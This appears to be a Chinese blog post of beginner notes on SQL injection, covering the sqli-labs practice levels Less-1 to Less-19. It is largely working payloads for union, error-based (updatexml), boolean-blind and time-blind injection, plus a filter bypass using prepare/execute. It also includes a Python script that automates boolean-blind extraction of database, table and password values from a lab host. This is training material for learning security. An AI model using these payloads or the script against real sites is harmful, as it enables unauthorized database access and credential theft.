@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#3367D6"/>
+  <link rel="apple-touch-icon" href="/icons-192.png">
+  <link rel="manifest" href="/manifest.json">
+  
+  <meta name="generator" content="Hexo 7.1.1">
+
+  
+    <meta name="description" content="Pax is a handsome">
+  
+
+  
+    <meta name="keywords" content="handsome">
+  
+
+  
+    <meta name="author" content="pax">
+  
+
+  
+
+  
+
+  <title>SQL注入 | 布衣远游，心有所归</title>
+
+  
+
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+
+  <!--mathjax latex数学公式显示支持-->
+  
+  
+
+  
+
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body>
+  <div class="root-container">
+    
+<!-- header container -->
+<header class="header-container post">
+  
+    <div class="post-image" style="background-image: url(./photo/11.jpg)"></div>
+  
+
+  <!-- navbar -->
+<nav class="navbar">
+  <div class="navbar-content">
+    <!-- logo -->
+    <div class="navbar-logo">
+      <a href="/">
+        
+          布衣远游，心有所归
+        
+      </a>
+    </div>
+    <!-- link -->
+    <div class="navbar-link">
+      <div class="navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+      <ul class="navbar-list">
+        
+          <li class="navbar-list-item"><a href="/">首页</a></li>
+        
+          <li class="navbar-list-item"><a href="/links">友链</a></li>
+        
+          <li class="navbar-list-item"><a href="/about">关于</a></li>
+        
+          <li class="navbar-list-item"><a href="/poem">诗集</a></li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+    <div class="header-content">
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap">SQL注入</h1>
+          <h2 class="title-sub-wrap">
+            <strong>pax</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2024-03-18T15:02:11.000Z" itemprop="datePublished">2024-03-18</time>
+          </h2>
+          
+            <h2 class="last-time">
+              <span>最后更新于</span>
+              <time  class="article-updated" datetime="2024-03-18T23:28:10.188Z" itemprop="dateUpdated">2024-03-19</time>
+            </h2>
+          
+          
+            <h2 id="/2024/03/18/SQL%E6%B3%A8%E5%85%A5/" class="title-sub-wrap leancloud_visitors" data-flag-title="SQL注入">
+              <em>文章访问量</em>
+              <i class="leancloud-visitors-count"></i>
+            </h2>
+          
+          <ul class="wrap-list dark">
+  
+</ul>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/tags/%E5%85%A5%E9%97%A8/">🏷️ 入门</a></li>
+  
+</ul>
+        </div>
+      </div>
+    </div>
+  
+
+  
+  
+  
+</header>
+
+    <!-- 文章 -->
+
+<!-- 文章内容 -->
+<div class="body-container">
+  <article class="content-container layout-block post-container">
+    <div class="article-info">
+      
+      
+      
+      
+      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
+        <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h2><h3 id="判断字符型或者数字型注入"><a href="#判断字符型或者数字型注入" class="headerlink" title="判断字符型或者数字型注入"></a>判断字符型或者数字型注入</h3><p>字符型：</p>
+<p>&#x2F;?id&#x3D; 1’ and ‘1’&#x3D;‘1 正确</p>
+<p>&#x2F;?id&#x3D; 1’ and ‘1’&#x3D;‘2’ 语义错误（非语法错误）</p>
+<p>数字型：</p>
+<p>&#x2F;?id&#x3D; 1 and 1&#x3D;1 正确</p>
+<p>&#x2F;?id&#x3D; 1 and 1&#x3D; 2 语义错误（非语法错误）</p>
+<h3 id="记忆"><a href="#记忆" class="headerlink" title="记忆"></a>记忆</h3><p>核心数据库：information_schema</p>
+<p>其中的表：schema, tables, columns</p>
+<p>其中的列：</p>
+<p>schema：schemata</p>
+<p>tables：table_schema</p>
+<p>columns：table_name</p>
+<h3 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h3><blockquote>
+<p><em><strong>*updatexml()函数的使用：更新xml文档的函数，返回替换的XML片段*</strong></em></p>
+<p><em><strong>*语法：updatexml（xml_documat，XPath_string，new_value）*</strong></em></p>
+<p>参数：1xml_documat：是STRING格式，为XML文档对象的名称，这一项可以输入一个十六进制的字符，比如0x26（&amp;）。</p>
+<p>2XPath_string：是XPath的格式的字符串，报错注入时需要写入错误的格式来显示错误的信息。</p>
+<p>3new_value：是string格式替换查找到符合条件的数据，在注入时可以加入任意字符，比如0x26（&amp;）。</p>
+</blockquote>
+<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>GET：–+</p>
+<p>POST：#</p>
+<p>附：如果是GET想用#，则先进行URL编码：%23</p>
+<h3 id="过滤与绕过"><a href="#过滤与绕过" class="headerlink" title="过滤与绕过"></a>过滤与绕过</h3><h4 id="select过滤"><a href="#select过滤" class="headerlink" title="select过滤"></a>select过滤</h4><p>查库：show database();</p>
+<p>查表：show tables；</p>
+<p>查列：desc table_name;</p>
+<p>查数据：看来必须要用select关键字，直接预编译：</p>
+<blockquote>
+<p>@预定义prepare模板</p>
+<p>prepare xxx as select * from user where id&#x3D;1;  &#x2F;&#x2F;将select查询语句定义为xxx</p>
+<p>execute xxx;  &#x2F;&#x2F;再使用execute来执行这个变量xxx即可执行上诉的select查询语句</p>
+<p>所以本题，先是使用prepare来预定义@a语句为hello，然后再使用execute来执行hello，这里execute执行的就是@a语句。</p>
+</blockquote>
+<p>举个栗子：0’;sEt@a&#x3D;concat(“sel”,”ect flag from  <code>1919810931114514</code>“);PRepare hello from @a;execute hello;#</p>
+<blockquote>
+<p>这里是通过concat函数将查询语句进行连接，然后赋值给变量@a，然后再通过prepare来预定义@a的查询语句为hello，最后再使用execute来执行hello。</p>
+</blockquote>
+<h2 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h2><p>联合注入</p>
+<p>报错注入</p>
+<p>布尔盲注</p>
+<p>时间盲注</p>
+<p>头部注入</p>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>该注入需要特殊的条件，比如函数：mysqli_multi_query()，其可以执行一条或多条SQL语句。</p>
+<p>使用格式也简单，用分号**;**闭合语句，再写入一条语句。</p>
+<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>推荐文章：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/39917830">https://zhuanlan.zhihu.com/p/39917830</a></p>
+<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><blockquote>
+<p><strong>二次注入的原理，在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，但是addslashes有一个特点就是虽然参数在过滤后会添加 “\” 进行转义，但是“\”并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。</strong><br><strong>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</strong></p>
+</blockquote>
+<p>须知：二次注入并不会马上生效，正如其名，会在下次相关SQL语句执行时生效。</p>
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>推荐文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46467017/article/details/126247133">https://blog.csdn.net/m0_46467017/article/details/126247133</a></p>
+<h4 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h4><p>宽字节：如果一个字符的大小为两个字节，则称之为宽字节。</p>
+<blockquote>
+<p>像<strong>GB2321、GBK、GB18030、BIG5、Shift_JIS</strong>等这些编码都是常说的宽字节，也就是只有两个字节。<br>英文默认占一个字节，中午占两个字节。</p>
+</blockquote>
+<h4 id="宽字节注入的条件"><a href="#宽字节注入的条件" class="headerlink" title="宽字节注入的条件"></a>宽字节注入的条件</h4><ol>
+<li>数据库为GBK编码</li>
+<li>使用了转义函数，将、POGETST、cookie传递的参数进行过滤，将单引号、双引号、null等敏感字符用转义符\进行转义</li>
+</ol>
+<p>具体看Less-32，我写得尽量详细一点</p>
+<h2 id="sqlilab"><a href="#sqlilab" class="headerlink" title="sqlilab"></a>sqlilab</h2><h3 id="Less-1-Less-2"><a href="#Less-1-Less-2" class="headerlink" title="Less-1 Less-2"></a>Less-1 Less-2</h3><p>tip：最基本的整数型与字符型注入</p>
+<p>1.判断GET还是POST</p>
+<p>&#x2F;?id&#x3D;1</p>
+<p>2.是否有单引号闭合</p>
+<p>在基础模块（上文）有提及，不赘述</p>
+<p>3.判断占位数</p>
+<p>&#x2F;?id&#x3D;1 order by 1	正确</p>
+<p>&#x2F;?id&#x3D;1 order by 2	正确</p>
+<p>&#x2F;?id&#x3D;1 order by 3	正确</p>
+<p>&#x2F;?id&#x3D;1 order by 4	报错</p>
+<p>4.查看显示位</p>
+<p>太简单，不赘述</p>
+<p>5.爆数据（有单引号闭合的自行加入，下文默认数字型）</p>
+<p>爆库：</p>
+<p>&#x2F;?id&#x3D;-1 union select 1,2, group_concat(schema_name) from information_schemata –+  </p>
+<p>爆表：</p>
+<p>&#x2F;?id&#x3D;-1 union select 1,2, group_concat(table_name) from information_schema.tables where table_schema &#x3D; ‘HHH’  –+ </p>
+<p>爆列：</p>
+<p>&#x2F;?id&#x3D;-1 union select 1,2, group_concat(column_name) from information_schema.columns where table_name &#x3D; ‘HHH’  –+ </p>
+<p>爆值：</p>
+<p>&#x2F;?id&#x3D;-1 union select group_concat(id, pq, ···) from hhhh –+</p>
+<h3 id="Less-3-Less-4"><a href="#Less-3-Less-4" class="headerlink" title="Less-3 Less-4"></a>Less-3 Less-4</h3><p>tip：这两关有小括号闭合</p>
+<p>测试：</p>
+<p>&#x2F;?id &#x3D; 1	正常</p>
+<p>&#x2F;?id &#x3D; 1’	报错，小括号闭合</p>
+<p>应对方式：</p>
+<p>&#x2F;?id&#x3D; -1) –+ </p>
+<p>其他与前两关一致</p>
+<h3 id="Less-5-Less-6"><a href="#Less-5-Less-6" class="headerlink" title="Less-5 Less-6"></a>Less-5 Less-6</h3><p>tip：报错注入</p>
+<p>测试：</p>
+<p>&#x2F;?id&#x3D;1	正常，不显示信息</p>
+<p>&#x2F;?id&#x3D;-1	报错</p>
+<p>利用updataxml()函数（基础模块有介绍）</p>
+<p>闭合方式：</p>
+<p>Less-5是单引号闭合</p>
+<p>Less-6是双引号闭合</p>
+<p>爆库：</p>
+<p>&#x2F;?id&#x3D;1’ and updatexml(1,concat(0x7e,mid((select group_concat(schema_name) from information_schema.schemata),1,31)),1) –+ </p>
+<p>爆表：</p>
+<p>&#x2F;?id&#x3D;1’ and updataxml(1, concat(0x7e, mid((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;‘HHH’),1,31)),1) –+ </p>
+<p>爆列：</p>
+<p>&#x2F;?id&#x3D;1’ and updataxml(1, concat(0x7e, mid((select group_concat(column_name) from information_schema.columns where table_sname&#x3D;‘HHH’),1,31)),1) –+ </p>
+<p>爆值：</p>
+<p>&#x2F;?id&#x3D;1’ and updataxml(1, concat(0x7e, mid((select group_concat(id···) from hhh),1,31)),1) –+ </p>
+<h3 id="Less-7-Less-8"><a href="#Less-7-Less-8" class="headerlink" title="Less-7 Less-8"></a>Less-7 Less-8</h3><p>tip：布尔盲注，本次以Less-8为主</p>
+<p>存在单引号闭合</p>
+<h4 id="布尔盲注步骤详解"><a href="#布尔盲注步骤详解" class="headerlink" title="布尔盲注步骤详解"></a>布尔盲注步骤详解</h4><p>页面只能返回正确或错误，无法报错注入。</p>
+<p>步骤：对数据库，表，列都一样，有以下几步</p>
+<ol>
+<li>确定值的个数</li>
+<li>确定一个值的长度</li>
+<li>确定一个值的组成</li>
+</ol>
+<h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><p>由于操作量太大，我们只从security-&gt;users-&gt;id</p>
+<h5 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h5><h6 id="个数"><a href="#个数" class="headerlink" title="个数"></a>个数</h6><h6 id="长度"><a href="#长度" class="headerlink" title="长度"></a>长度</h6><p>&#x2F;?id&#x3D;1’ and length(database()) &gt; 7 –+ 	true</p>
+<p>&#x2F;?id&#x3D;1’ and length(database()) &gt; 8 –+	语义错误</p>
+<p>可知长度为8</p>
+<h6 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h6><p>&#x2F;?id&#x3D;1’ and ascii(substr((database()),1,1)) &gt; 97 –+ </p>
+<p>······</p>
+<p>得知当前数据库：security</p>
+<h5 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h5><h6 id="个数-1"><a href="#个数-1" class="headerlink" title="个数"></a>个数</h6><p>&#x2F;?id&#x3D;1’ and (select count(table_name) from information_schema.tables where table_schema&#x3D;database()) &gt; 3 –+ 	正确</p>
+<p>&#x2F;?id&#x3D;1’ and (select count(table_name) from information_schema.tables where table_schema&#x3D;database()) &gt; 4 –+ 	语义错误</p>
+<p>可知有四个表：emails,referers,uagents,users</p>
+<h6 id="长度-1"><a href="#长度-1" class="headerlink" title="长度"></a>长度</h6><p>&#x2F;?id&#x3D;1’ and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3, 1)) &gt; 5 –+ 	正确</p>
+<p>&#x2F;?id&#x3D;1’ and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3, 1)) &gt; 6 –+ 	语言错误</p>
+<p>可知第四个表长度为5</p>
+<h6 id="组成-1"><a href="#组成-1" class="headerlink" title="组成"></a>组成</h6><p>&#x2F;?id&#x3D;1’ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3, 1),1,1)) &gt; 97 –+ </p>
+<p>可知表为users</p>
+<h5 id="爆列"><a href="#爆列" class="headerlink" title="爆列"></a>爆列</h5><h6 id="个数-2"><a href="#个数-2" class="headerlink" title="个数"></a>个数</h6><p>&#x2F;?id&#x3D;1’ and (select count(column_name) from information_schema.columns where table_name&#x3D;’users’) &gt; 2 –+ 	正确</p>
+<p>&#x2F;?id&#x3D;1’ and (select count(column_name) from information_schema.columns where table_name&#x3D;’users’) &gt; 3 –+ 	语义错误</p>
+<p>可知三个列:id,username,password</p>
+<h6 id="长度-2"><a href="#长度-2" class="headerlink" title="长度"></a>长度</h6><p>&#x2F;?id&#x3D;1’ and length((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0, 1))  &#x3D; 2 –+ </p>
+<h6 id="组成-2"><a href="#组成-2" class="headerlink" title="组成"></a>组成</h6><p>&#x2F;?id&#x3D;1’ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0, 1),1,1)) &gt; 97 –+</p>
+<p>可知列：id</p>
+<h5 id="爆值"><a href="#爆值" class="headerlink" title="爆值"></a>爆值</h5><h6 id="个数-3"><a href="#个数-3" class="headerlink" title="个数"></a>个数</h6><p>?id&#x3D;1’ and (select count(*) from users) &gt; 12 –+ 	正确</p>
+<p>?id&#x3D;1’ and (select count(*) from users) &gt; 13 –+ 	语义报错</p>
+<p>可知有十三个</p>
+<p>长度，组成不赘述</p>
+<h4 id="布尔盲注python脚本"><a href="#布尔盲注python脚本" class="headerlink" title="布尔盲注python脚本"></a>布尔盲注python脚本</h4><p>以Less-8为例(手搓，巨费时)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">global</span> _database_name</span><br><span class="line"><span class="keyword">global</span> urlOpen</span><br><span class="line"><span class="keyword">global</span> mark</span><br><span class="line"><span class="keyword">global</span> _<span class="built_in">list</span></span><br><span class="line">_<span class="built_in">list</span> = []</span><br><span class="line"><span class="comment">#_list = [&#x27;emails&#x27;, &#x27;referers&#x27;, &#x27;uagents&#x27;, &#x27;users&#x27;]</span></span><br><span class="line">urlOpen = <span class="string">&quot;http://124.70.99.199:81/Less-8/?id=1&#x27;&quot;</span></span><br><span class="line">mark = <span class="string">&#x27;You are in...........&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">database_name</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">            url = urlOpen + <span class="string">f&quot;and ascii(substr(database(),<span class="subst">&#123;j&#125;</span>,1)) = <span class="subst">&#123;i&#125;</span> --+ &quot;</span></span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                name = name + <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span>(name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;Not found for <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="comment">#print(url)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;No match found for position <span class="subst">&#123;j&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;database_name:&#x27;</span>, name)</span><br><span class="line">    _database_name = name</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table_name</span>():</span><br><span class="line">    <span class="built_in">list</span> = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):<span class="comment">#有几个表</span></span><br><span class="line">        name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">12</span>):<span class="comment">#一个表有几个字</span></span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>, <span class="number">123</span>):<span class="comment">#一个字是什么字</span></span><br><span class="line">                url = urlOpen + <span class="string">f&quot;and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit <span class="subst">&#123;i&#125;</span>, 1),<span class="subst">&#123;j&#125;</span>,1)) = <span class="subst">&#123;y&#125;</span> --+ &quot;</span></span><br><span class="line">                <span class="comment">#print(url)</span></span><br><span class="line">                r = requests.get(url)</span><br><span class="line">                <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                    name = name + <span class="built_in">chr</span>(y)</span><br><span class="line">                    <span class="comment">#print(name)</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        _<span class="built_in">list</span>.append(name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;table_name:&#x27;</span>, _<span class="built_in">list</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;表函数已结束&#x27;</span>)</span><br><span class="line">table_name()</span><br><span class="line"><span class="comment">#[&#x27;emails&#x27;, &#x27;referers&#x27;, &#x27;uagents&#x27;, &#x27;users&#x27;, &#x27;&#x27;, &#x27;&#x27;]</span></span><br><span class="line"><span class="comment">#选一个</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_name</span>():</span><br><span class="line">    list_1 = []</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">        list_2 = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">            name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">                <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>, <span class="number">123</span>):</span><br><span class="line">                    url = urlOpen + <span class="string">f&quot;and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;<span class="subst">&#123;_<span class="built_in">list</span>[a]&#125;</span>&#x27; limit <span class="subst">&#123;i&#125;</span>, 1),<span class="subst">&#123;j&#125;</span>,1)) = <span class="subst">&#123;y&#125;</span> --+ &quot;</span></span><br><span class="line">                    r = requests.get(url)</span><br><span class="line">                    <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                        name = name + <span class="built_in">chr</span>(y)</span><br><span class="line">                        <span class="built_in">print</span>(name)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;y&#125;</span> 不是&#x27;</span>)</span><br><span class="line">            list_2.append(name)</span><br><span class="line">        <span class="built_in">print</span>(list_2)</span><br><span class="line">        list_1.append(list_2)</span><br><span class="line">    <span class="built_in">print</span>(list_1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#选择一个值</span></span><br><span class="line">table_value = <span class="string">&#x27;users&#x27;</span></span><br><span class="line">column_value = <span class="string">&#x27;password&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">value</span>(<span class="params">table_value, column_value</span>):</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">            url = urlOpen + <span class="string">f&quot;and ascii(substr((select <span class="subst">&#123;column_value&#125;</span> from <span class="subst">&#123;table_value&#125;</span>),<span class="subst">&#123;i&#125;</span>,1)) = <span class="subst">&#123;j&#125;</span> --+ &quot;</span></span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                name = name + <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;j&#125;</span>不是&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    a = <span class="built_in">input</span>(<span class="string">&#x27;press enter to&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> a == <span class="string">&#x27;database_name&#x27;</span>:</span><br><span class="line">        database_name()</span><br><span class="line">    <span class="keyword">elif</span> a == <span class="string">&#x27;table_name&#x27;</span>:</span><br><span class="line">        table_name()</span><br><span class="line">    <span class="keyword">elif</span> a == <span class="string">&#x27;column_value&#x27;</span>:</span><br><span class="line">        column_name()</span><br><span class="line">    <span class="keyword">elif</span> a == <span class="string">&quot;value&quot;</span>:</span><br><span class="line">        table_value = <span class="built_in">input</span>(<span class="string">&#x27;give me the table&#x27;</span>)</span><br><span class="line">        column_value = <span class="built_in">input</span>(<span class="string">&#x27;give me the column&#x27;</span>)</span><br><span class="line">        value(table_value, column_value)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;invalid input&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-9-Less10"><a href="#Less-9-Less10" class="headerlink" title="Less-9 Less10"></a>Less-9 Less10</h3><p>tip：时间盲注，本次以Less-9为主</p>
+<p>存在单引号闭合</p>
+<p>简单介绍一下if语法即可：</p>
+<p><em><strong>*语法：if(expr1，expr2，expr3)*</strong></em></p>
+<p> 语法含义：如果expr1是true，则if()的返回值为expr2，否则返回值则为expr3。</p>
+<p>例子：</p>
+<p>&#x2F;?id&#x3D;1’ and  if((1&#x3D;1), sleep(10),1)</p>
+<p>迫于时间压力，先不学时间盲注脚本</p>
+<h3 id="Less-11-Less-12"><a href="#Less-11-Less-12" class="headerlink" title="Less-11 Less-12"></a>Less-11 Less-12</h3><p>tip：POST提交方式</p>
+<p>本次以Less-11 为主，两关区别是单引号或双引号闭合</p>
+<p>用POST提交</p>
+<p>剩下的一样</p>
+<h3 id="Less-13-Less-14"><a href="#Less-13-Less-14" class="headerlink" title="Less-13 Less-14"></a>Less-13 Less-14</h3><p>本次以Less-13 为主，两关区别是单引号加小括号或双引号闭合</p>
+<p>附：测试时返回这样一句话：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘1’) LIMIT 0,1’ at line 1</p>
+<p>其中的“o use near ‘1’) LIMIT 0,1’”告诉我们闭合方式是(‘’),Less-14同理</p>
+<p>输入正确无反应，采用报错或盲注，本次为报错注入</p>
+<p>例子：</p>
+<p>passwd&#x3D;1&amp;uname&#x3D;1’) and updatexml(1,concat(0x7e, mid(database(),1,31)),1) #</p>
+<p>可以报错注入，剩下照旧</p>
+<h3 id="Less-15-Less-16"><a href="#Less-15-Less-16" class="headerlink" title="Less-15 Less-16"></a>Less-15 Less-16</h3><p>不管正确还是错误都没有回显，只能使用时间盲注</p>
+<p>我会补脚本的，其实还有一个问题，就是如何在没有信息的情况下得知闭合方式，不要看source的那种</p>
+<h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><p>源码提示uname参数不可用，使用passwd参数</p>
+<p>使用报错注入</p>
+<h3 id="小结-基本注入"><a href="#小结-基本注入" class="headerlink" title="小结(基本注入)"></a>小结(基本注入)</h3><h4 id="联合注入："><a href="#联合注入：" class="headerlink" title="联合注入："></a>联合注入：</h4><p>联合注入要求前面的条件是错的，需要注意占位数，回显位</p>
+<p>当输入正确时有回显，可以使用联合注入</p>
+<h4 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h4><p>报错注入要求前面的条件是真的</p>
+<p>当输入正确无回显，输入语法错误有回显时，可以使用报错注入</p>
+<h4 id="布尔盲注："><a href="#布尔盲注：" class="headerlink" title="布尔盲注："></a>布尔盲注：</h4><p>报错注入要求前面的条件是真的</p>
+<p>当输入正确无回显，输入语法错误无回显，输入语义错误有回显，可以使用布尔盲注</p>
+<h4 id="时间盲注："><a href="#时间盲注：" class="headerlink" title="时间盲注："></a>时间盲注：</h4><p>要求与布尔盲注一致</p>
+<p>当无论怎样都无回显时，可以使用时间盲注</p>
+<h3 id="Less-18-Less-19"><a href="#Less-18-Less-19" class="headerlink" title="Less-18 Less-19"></a>Less-18 Less-19</h3><p>tip：其实一直忘了说一件事，正确账号和密码都是<strong>admin</strong>，另外，本次是UA注入</p>
+<p>本处以Less-18为主，Less-19把UA换成Referer</p>
+<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>经过测试可知：语义错误无回显，语法错误无回显，登入成功回显UA</p>
+<p>猜测此处存在UA注入</p>
